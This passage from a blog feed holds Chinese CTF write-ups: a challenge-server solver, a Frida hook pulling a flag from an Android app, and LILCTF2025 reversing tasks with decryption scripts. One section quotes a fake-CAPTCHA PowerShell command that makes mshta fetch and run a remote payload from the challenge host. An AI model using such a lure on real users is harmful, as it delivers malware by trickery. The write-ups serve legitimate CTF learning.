class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_procs):</span><br><span class="line"></span><br><span class="line">    r_start = i * chunk_size</span><br><span class="line">    </span><br><span class="line">    r_end = <span class="built_in">min</span>((i + <span class="number">1</span>) * chunk_size, RIGHT_SIZE)</span><br><span class="line">    </span><br><span class="line">    p = Process(target=worker_proc, args=(i, r_start, r_end, B_list, A, U, D, TIME_INDICES, result_queue, stop_event))</span><br><span class="line">    </span><br><span class="line">    p.start()</span><br><span class="line">    </span><br><span class="line">    procs.append(p)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 等待结果或所有进程结束</span></span><br><span class="line"></span><br><span class="line">  found = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 阻塞等候直到有结果或所有子进程结束</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> result_queue.empty():</span><br><span class="line">    </span><br><span class="line">        item = result_queue.get()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">tuple</span>) <span class="keyword">and</span> item[<span class="number">0</span>] == <span class="string">&quot;ERR&quot;</span>:</span><br><span class="line">    </span><br><span class="line">          _, pid, errmsg = item</span><br><span class="line">    </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] 子进程 <span class="subst">&#123;pid&#125;</span> 报错: <span class="subst">&#123;errmsg&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">          found = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">          s_val, pid, t_used = item</span><br><span class="line">    </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;[MAIN] 子进程 <span class="subst">&#123;pid&#125;</span> 找到 secret=<span class="subst">&#123;s_val&#125;</span> 用时 <span class="subst">&#123;t_used:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">    </span><br><span class="line">          found = s_val</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      alive = <span class="built_in">any</span>(p.is_alive() <span class="keyword">for</span> p <span class="keyword">in</span> procs)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> alive:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">finally</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保停止信号发出并回收子进程</span></span><br><span class="line">    </span><br><span class="line">    stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> procs:</span><br><span class="line">    </span><br><span class="line">      p.join(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">  host = <span class="string">&quot;node8.anna.nssctf.cn&quot;</span></span><br><span class="line"></span><br><span class="line">  port = <span class="number">25543</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    </span><br><span class="line">    s.settimeout(<span class="number">30</span>)</span><br><span class="line">    </span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已连接到服务器&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">      chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      data += chunk</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="string">b&quot;&gt;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    banner = data.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Server banner (truncated):&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(banner[:<span class="number">1000</span>])</span><br><span class="line">    </span><br><span class="line">    B_list = parse_B_list_from_banner(banner)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> B_list <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;无法解析 B_list&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;B_list:&quot;</span>, B_list)</span><br><span class="line">    </span><br><span class="line">    t0 = time.time()</span><br><span class="line">    </span><br><span class="line">    secret = find_secret_parallel(B_list)</span><br><span class="line">    </span><br><span class="line">    t_used = time.time() - t0</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;并行搜索总耗时: %.2f s&quot;</span> % t_used)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;未找到 secret&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找到 secret:&quot;</span>, secret)</span><br><span class="line">    </span><br><span class="line">    s.send(<span class="built_in">str</span>(secret).encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取服务器响应</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    </span><br><span class="line">      s.settimeout(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">      resp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">        chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        resp += chunk</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器响应：&quot;</span>, resp.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image18.png"></p><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="我是谁？！"><a href="#我是谁？！" class="headerlink" title="我是谁？！"></a>我是谁？！</h2><p>拖入jadx分析</p><p><img src="/2025/08/23/JGCTF-8-WP/image19.png"></p><p>如果priv方法返回1，则调用PR.showCND(this)，否则调用PR.showMultiDialogs(this, this.messages)。</p><p>this, this.messages 就是垃圾信息</p><p>所以这里猜测让他返回1 就能直接打印出flag</p><p>最开始尝试 直接hook priv方法，让他强制返回1，但是app直接闪退了</p><p>测试半天发现 我们可以直接获取flag字符串，不让他显示ui就行了</p><p>尝试直接调用PR.stringFromJNI()方法来获取flag字符串，而不显示对话框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 直接获取flag字符串</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">PR</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.nss_4th.ad.PR&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> prInstance = <span class="variable constant_">PR</span>.$new();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> flag = prInstance.<span class="title function_">stringFromJNI</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Flag: &quot;</span> + flag);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将flag发送到日志或文件</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">send</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image20.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;JGCTF-第8-WP&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://heisha123.github.io/categories/CTF/"/>
    
    
    <category term="NSSCTF2025" scheme="https://heisha123.github.io/tags/NSSCTF2025/"/>
    
  </entry>
  
  <entry>
    <title>LILCTF2025 RE</title>
    <link href="https://heisha123.github.io/2025/08/16/lilctf-re-wp/"/>
    <id>https://heisha123.github.io/2025/08/16/lilctf-re-wp/</id>
    <published>2025-08-16T15:15:25.000Z</published>
    <updated>2025-08-25T09:46:58.148Z</updated>
    
    <content type="html"><![CDATA[<p>这次只做了逆向题，还行，至少没爆0嘻嘻嘻！！</p><span id="more"></span><h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a>Oh_My_Uboot</h2><p>下载附件拿到.txt，根据题目提示Uboot，将.txt改为.su</p><p>拖入ida分析</p><p>通过交叉引用，找到关键函数</p><p><img src="/2025/08/16/lilctf-re-wp/image1.png"></p><p>在查看交叉引用</p><p><img src="/2025/08/16/lilctf-re-wp/image2.png"></p><p>继续追</p><p>sub_60813F74</p><p>整体看下来这个函数是一个循环执行的交互式口令校验函数</p><p><img src="/2025/08/16/lilctf-re-wp/image3.png"></p><p> 准备提示字符串（解密后显示给用户）。</p><p> 从用户输入读取密码，带退格处理，回显 *。</p><p> 输入结束（回车 0x0D），进行处理和验证。</p><p> 如果输入与目标密文匹配成功，则退出循环，否则继续。</p><p>下面先对输入 XOR 0x72。</p><p>把 XOR 后的结果做 Base58 类似的编码。</p><p> 内部循环用 &#x2F;58 和 %58 拆分。</p><p> 使用一个自定义字符表（由 v23、v25 组合）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOBYTE(v8) = 48;</span><br><span class="line"></span><br><span class="line">v9 = &amp;v25;</span><br><span class="line"></span><br><span class="line">do &#123;</span><br><span class="line"></span><br><span class="line"> *v9++ = v8;</span><br><span class="line"></span><br><span class="line"> v8 = (unsigned __int8)(v8 + 1);</span><br><span class="line"></span><br><span class="line">&#125; while ( v8 != 106 );</span><br></pre></td></tr></table></figure><p>这里自定义的字符集</p><p>我们跑一下出来就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmno...i</span><br></pre></td></tr></table></figure><p>接下来写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从逆向推测得到的自定义字母表</span></span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>, <span class="number">0x69</span>+<span class="number">1</span>)]) </span><br><span class="line"><span class="comment"># 即 &quot;0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmno...i&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">s</span>):</span><br><span class="line">  num = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">    idx = alphabet.index(ch) <span class="comment"># 用自定义 alphabet 查找位置</span></span><br><span class="line">    num = num * <span class="number">58</span> + idx   <span class="comment"># 每次基数为 58</span></span><br><span class="line">  <span class="keyword">return</span> num.to_bytes((num.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encoded</span>):</span><br><span class="line">  raw = custom_decode(encoded)</span><br><span class="line">  <span class="comment"># XOR 0x72</span></span><br><span class="line">  plain = <span class="built_in">bytes</span>([b ^ <span class="number">0x72</span> <span class="keyword">for</span> b <span class="keyword">in</span> raw])</span><br><span class="line">  <span class="keyword">return</span> plain</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  target = <span class="string">&quot;5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    pwd = decrypt(target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered password:&quot;</span>, pwd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;As string:&quot;</span>, pwd.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码失败:&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/lilctf-re-wp/image4.png"></p><h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>Cmd<br>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://challenge.xinshi.fun:42636/Coloringoutomic_Host.mp3  http://challenge.xinshi.fun:42636/Coloringoutomic_Host.mp3 #   ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086</span><br></pre></td></tr></table></figure><p>出现</p><p><img src="/2025/08/16/lilctf-re-wp/image5.png"></p><p>我们先执行下 <code>shutdown /a</code></p><p>避免关机</p><p>然后dbgx32附加</p><p>直接搜索字符串</p><p><code>CTF&#123;</code></p><p><img src="/2025/08/16/lilctf-re-wp/image6.png"></p><p>ARM ASM</p><p>先拖入jadx 分析</p><p><img src="/2025/08/16/lilctf-re-wp/image7.png"></p><p>调用了check方法，需要调试so层</p><p><img src="/2025/08/16/lilctf-re-wp/image8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (__strlen_chk(v9, 0xFFFFFFFFFFFFFFFFLL) == 48) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">else &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>先判断了一下输入的长度是否是48</p><p>然后进行三轮 NEON 向量运算</p><p>最后自定义base64返回</p><p>查看strings表</p><p><img src="/2025/08/16/lilctf-re-wp/image9.png"></p><p>拿到自定义base64字符集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/</span><br></pre></td></tr></table></figure><p>vqtbl1q_s8指令是用v8作为索引去原始数据块中查表</p><p>计算table_result &#x3D; 加密块 ^ v8</p><p>块 1 和块 0 使用的v8为原始t</p><p>块 2 使用的v8是t与 1 异或的结果</p><p><img src="/2025/08/16/lilctf-re-wp/image10.png"></p><p>直接访问t拿到值</p><p><code>0D 0E 0F 0C 0B 0A 09 08 06 07 05 04 02 03 01 00</code></p><p><img src="/2025/08/16/lilctf-re-wp/image11.png"></p><p>编写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64decode</span>(<span class="params">s, table</span>):</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;&quot;&quot;使用自定义Base64表解码&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  char_to_val = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(table)&#125;</span><br><span class="line"></span><br><span class="line">  vals = [char_to_val[c] <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line">  bytes_list = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(vals), <span class="number">4</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">3</span> &gt;= <span class="built_in">len</span>(vals):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span> <span class="comment"># 处理完整的4字符组</span></span><br><span class="line">    </span><br><span class="line">    v1, v2, v3, v4 = vals[i], vals[i+<span class="number">1</span>], vals[i+<span class="number">2</span>], vals[i+<span class="number">3</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组合为3个字节</span></span><br><span class="line">    </span><br><span class="line">    b1 = (v1 &lt;&lt; <span class="number">2</span>) | (v2 &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    b2 = ((v2 &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (v3 &gt;&gt; <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    b3 = ((v3 &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>) | v4</span><br><span class="line">    </span><br><span class="line">    bytes_list.extend([b1, b2, b3])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes_list[:<span class="number">48</span>] <span class="comment"># 确保只取48字节</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_bit_operation</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;&quot;&quot;逆位运算：还原加密时的位操作&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  result = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> j + <span class="number">1</span> &gt;= <span class="built_in">len</span>(data):</span><br><span class="line">    </span><br><span class="line">      result.extend(data[j:])</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 还原第j个字节 (加密: ej = (x &gt;&gt;5) | (x &lt;&lt;3))</span></span><br><span class="line">    </span><br><span class="line">    ej = data[j]</span><br><span class="line">    </span><br><span class="line">    original_j = ((ej &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">5</span>) | ((ej &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 还原第j+1个字节 (加密: ej1 = (x &gt;&gt;1) | (x &lt;&lt;7))</span></span><br><span class="line">    </span><br><span class="line">    ej1 = data[j+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    original_j1 = ((ej1 &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) | ((ej1 &amp; <span class="number">0x7F</span>) &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第j+2个字节不变</span></span><br><span class="line">    </span><br><span class="line">    original_j2 = data[j+<span class="number">2</span>] <span class="keyword">if</span> (j+<span class="number">2</span> &lt; <span class="built_in">len</span>(data)) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    result.extend([original_j, original_j1, original_j2])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result[:<span class="number">48</span>] <span class="comment"># 确保长度为48字节</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_neon</span>(<span class="params">data, t</span>):</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;&quot;&quot;逆NEON向量操作：修正查表方向错误&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 计算各轮使用的v8向量（加密时的v8）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 加密时处理顺序：i=0 → i=1 → i=2，解密需逆序处理</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># v8初始值为t，每轮处理后与轮次索引异或（i=0,1,2）</span></span><br><span class="line"></span><br><span class="line">  v8_round2 = [x ^ <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> t] <span class="comment"># 处理块2时的v8（i=2时使用，已与i=1异或）</span></span><br><span class="line"></span><br><span class="line">  v8_round1 = t.copy()      <span class="comment"># 处理块1时的v8（i=1时使用，仅与i=0异或后不变）</span></span><br><span class="line"></span><br><span class="line">  v8_round0 = t.copy()      <span class="comment"># 处理块0时的v8（i=0时使用，初始值）</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment"># 分3个16字节块</span></span><br><span class="line"></span><br><span class="line">  blocks = [</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>:<span class="number">16</span>],  <span class="comment"># 块0</span></span><br><span class="line">    </span><br><span class="line">    data[<span class="number">16</span>:<span class="number">32</span>], <span class="comment"># 块1</span></span><br><span class="line">    </span><br><span class="line">    data[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 块2</span></span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment"># 逆操作函数：单个块解密</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">encrypted_block, v8</span>):</span><br><span class="line"></span><br><span class="line">    original_block = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算table_result = encrypted_block ^ v8</span></span><br><span class="line">    </span><br><span class="line">    table_result = [eb ^ v <span class="keyword">for</span> eb, v <span class="keyword">in</span> <span class="built_in">zip</span>(encrypted_block, v8)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 还原原始块：original_block[v8[i]] = table_result[i]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    </span><br><span class="line">      idx = v8[i] % <span class="number">16</span> <span class="comment"># 确保索引在0-15范围内</span></span><br><span class="line">    </span><br><span class="line">      original_block[idx] = table_result[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> original_block</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 按逆序解密（先解密最后处理的块）</span></span><br><span class="line"></span><br><span class="line">  blocks[<span class="number">2</span>] = decrypt_block(blocks[<span class="number">2</span>], v8_round2)</span><br><span class="line"></span><br><span class="line">  blocks[<span class="number">1</span>] = decrypt_block(blocks[<span class="number">1</span>], v8_round1)</span><br><span class="line"></span><br><span class="line">  blocks[<span class="number">0</span>] = decrypt_block(blocks[<span class="number">0</span>], v8_round0)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment"># 拼接解密结果</span></span><br><span class="line"></span><br><span class="line">  <span 